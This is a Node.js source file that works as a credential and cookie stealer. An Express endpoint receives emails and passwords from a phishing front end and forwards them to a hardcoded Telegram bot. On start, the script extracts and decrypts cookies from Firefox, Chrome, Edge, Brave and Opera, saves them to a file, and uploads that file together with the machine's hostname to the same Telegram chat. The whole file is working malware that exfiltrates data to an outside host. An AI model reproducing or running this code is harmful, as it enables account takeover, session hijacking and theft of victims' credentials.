// ------------------------- MODULES -------------------------
const fs = require('fs');
const path = require('path');
const os = require('os');
const sqlite3 = require('sqlite3').verbose();
const crypto = require('crypto');
const keytar = require('keytar');
const fetch = require('node-fetch');
const FormData = require('form-data');

// Safe express declaration
let express;
try {
    express = require.cache[require.resolve('express')]?.exports || require('express');
} catch {
    express = require('express');
}

// Safe body-parser declaration
let bodyParser;
try {
    bodyParser = require.cache[require.resolve('body-parser')]?.exports || require('body-parser');
} catch {
    bodyParser = require('body-parser');
}

// ------------------------- CONFIG -------------------------
const OUTPUT_FILE = 'cookies.json';
const TELEGRAM_BOT_TOKEN = "8366154069:AAFTClzM2Kbirysud1i49UAWmEC6JP0T0xg";
const TELEGRAM_CHAT_ID = "7574749243";
const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
const TELEGRAM_FILE_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`;

// ------------------------- DEBUG UTILITY -------------------------
function debugLog(msg) { console.log(`[DEBUG] ${msg}`); }

// ------------------------- SERVER -------------------------
const app = express();
app.use(bodyParser.json());
app.use(express.static('public')); // serve HTML + JS in public folder

app.post('/send-message', async (req, res) => {
    const { email, password } = req.body;
    console.log("Received from frontend:", email, password);

    const text = `💻 User submitted:\nEmail: ${email}\nPassword: ${password}`;
    try {
        await fetch(TELEGRAM_API_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text })
        });
    } catch (err) {
        console.log("❌ Telegram send failed:", err);
    }

    res.json({ success: true });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`✅ Server running on port ${PORT}`));

// ------------------------- WINDOWS-ONLY MODULE -------------------------
let dpapi;
if (process.platform === 'win32') {
    try {
        dpapi = require('win-dpapi');
    } catch (e) {
        console.log('[DEBUG] win-dpapi not installed or cannot load on this platform.');
    }
}

// ------------------------- HELPER FUNCTIONS -------------------------
function parseExpiry(expiry) {
    const value = parseInt(expiry, 10);
    return isNaN(value) ? null : value;
}

function parseChromiumExpiry(expires_utc) {
    const epoch = new Date('1601-01-01T00:00:00Z').getTime();
    return Math.floor(epoch / 1000 + expires_utc / 1000000);
}

// ------------------------- FIREFOX COOKIE EXTRACTION (ASYNC) -------------------------
async function extractFirefoxCookies() {
    const cookiesList = [];
    const profilesPath = process.platform === 'win32'
        ? path.join(os.homedir(), 'AppData', 'Roaming', 'Mozilla', 'Firefox', 'Profiles')
        : path.join(os.homedir(), 'Library', 'Application Support', 'Firefox', 'Profiles');

    if (!fs.existsSync(profilesPath)) return cookiesList;

    const profiles = fs.readdirSync(profilesPath);
    for (const profile of profiles) {
        const dbPath = path.join(profilesPath, profile, 'cookies.sqlite');
        if (!fs.existsSync(dbPath)) continue;

        const db = new sqlite3.Database(dbPath, sqlite3.OPEN_READONLY);

        const rows = await new Promise((resolve, reject) => {
            db.all(
                `SELECT host, name, value, path, expiry, isSecure, isHttpOnly FROM moz_cookies`,
                (err, rows) => {
                    if (err) reject(err);
                    else resolve(rows || []);
                }
            );
        });

        for (const r of rows) {
            cookiesList.push({
                domain: r.host,
                name: r.name,
                value: r.value,
                path: r.path || '/',
                expires: parseExpiry(r.expiry),
                httpOnly: !!r.isHttpOnly,
                secure: !!r.isSecure
            });
        }

        db.close();
    }

    return cookiesList;
}

// ------------------------- CHROMIUM COOKIE EXTRACTION -------------------------
const BROWSER_PATHS = process.platform === 'win32'
    ? {
        Chrome: path.join(os.homedir(), 'AppData', 'Local', 'Google', 'Chrome', 'User Data'),
        Edge: path.join(os.homedir(), 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data'),
        Brave: path.join(os.homedir(), 'AppData', 'Local', 'BraveSoftware', 'Brave-Browser', 'User Data'),
        Opera: path.join(os.homedir(), 'AppData', 'Roaming', 'Opera Software', 'Opera Stable'),
    }
    : {
        Chrome: path.join(os.homedir(), 'Library', 'Application Support', 'Google', 'Chrome'),
        Edge: path.join(os.homedir(), 'Library', 'Application Support', 'Microsoft Edge'),
        Brave: path.join(os.homedir(), 'Library', 'Application Support', 'BraveSoftware', 'Brave-Browser'),
        Opera: path.join(os.homedir(), 'Library', 'Application Support', 'com.operasoftware.Opera'),
    };

async function decryptChromiumCookie(encryptedValue, browser) {
    try {
        if (!encryptedValue || encryptedValue.length === 0) return '';

        // Windows DPAPI
        if (process.platform === 'win32') {
            if (dpapi) {
                return await new Promise((resolve) => {
                    try {
                        const decrypted = dpapi.unprotectData(encryptedValue, null, 'CurrentUser');
                        resolve(decrypted.toString('utf-8'));
                    } catch (e) {
                        debugLog(`❌ DPAPI decryption failed: ${e}`);
                        resolve('');
                    }
                });
            }
            return '';
        }

        // Mac / Linux AES decryption
        const password = await keytar.getPassword('Chrome Safe Storage', browser) || 'peanuts';
        const key = crypto.createHash('sha1').update(password).digest().slice(0, 16);
        const iv = Buffer.alloc(16, 0);

        const prefix = encryptedValue.slice(0, 3).toString();
        if (prefix === 'v10' || prefix === 'v11') {
            const decipher = crypto.createDecipheriv('aes-128-cbc', key, iv);
            return Buffer.concat([decipher.update(encryptedValue.slice(3)), decipher.final()]).toString();
        }

        return encryptedValue.toString();
    } catch (e) {
        debugLog(`❌ Failed to decrypt cookie: ${e}`);
        return '';
    }
}

async function extractChromiumCookies() {
    const cookiesList = [];

    for (const [browser, basePath] of Object.entries(BROWSER_PATHS)) {
        if (!fs.existsSync(basePath)) continue;

        const profiles = fs.readdirSync(basePath)
            .filter(f => {
                const fullPath = path.join(basePath, f);
                return fs.existsSync(fullPath) && fs.statSync(fullPath).isDirectory() &&
                    fs.existsSync(path.join(fullPath, 'Cookies'));
            });

        for (const profile of profiles) {
            const cookiePath = path.join(basePath, profile, 'Cookies');
            if (!fs.existsSync(cookiePath)) continue;

            const db = new sqlite3.Database(cookiePath, sqlite3.OPEN_READONLY);
            const rows = await new Promise((resolve, reject) => {
                db.all(
                    `SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies`,
                    (err, rows) => {
                        if (err) reject(err);
                        else resolve(rows || []);
                    }
                );
            });

            for (const r of rows) {
                const value = await decryptChromiumCookie(r.encrypted_value, browser);
                cookiesList.push({
                    domain: r.host_key,
                    name: r.name,
                    value,
                    path: r.path || '/',
                    expires: parseChromiumExpiry(r.expires_utc),
                    httpOnly: !!r.is_httponly,
                    secure: !!r.is_secure
                });
            }

            db.close();
        }
    }

    return cookiesList;
}

// ------------------------- SAVE & SEND COOKIES -------------------------
async function saveAndSendCookies() {
    const firefoxCookies = await extractFirefoxCookies();
    const chromiumCookies = await extractChromiumCookies();
    const cookies = firefoxCookies.concat(chromiumCookies);

    if (!cookies.length) {
        debugLog("⚠️ No cookies found");
        return;
    }

    fs.writeFileSync(OUTPUT_FILE, JSON.stringify(cookies, null, 4));
    debugLog(`✅ Cookies saved to ${OUTPUT_FILE}`);

    const systemInfo = `🖥 Computer Name: ${os.hostname()}`;
    await fetch(TELEGRAM_API_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: systemInfo })
    });

    const fileStream = fs.createReadStream(OUTPUT_FILE);
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    formData.append('document', fileStream);

    try {
        const res = await fetch(TELEGRAM_FILE_URL, { method: 'POST', body: formData });
        debugLog(res.ok ? "✅ Cookies sent to Telegram!" : "❌ Failed to send cookies");
    } catch (err) {
        debugLog(`❌ Error sending cookies: ${err}`);
    }
}

// ------------------------- RUN -------------------------
(async () => {
    debugLog("Testing Telegram bot connectivity...");
    const testRes = await fetch(TELEGRAM_API_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: "Telegram bot is connected!" })
    });
    debugLog(testRes.ok ? "✅ Telegram test message sent!" : "❌ Telegram test failed");

    await saveAndSendCookies();
})();
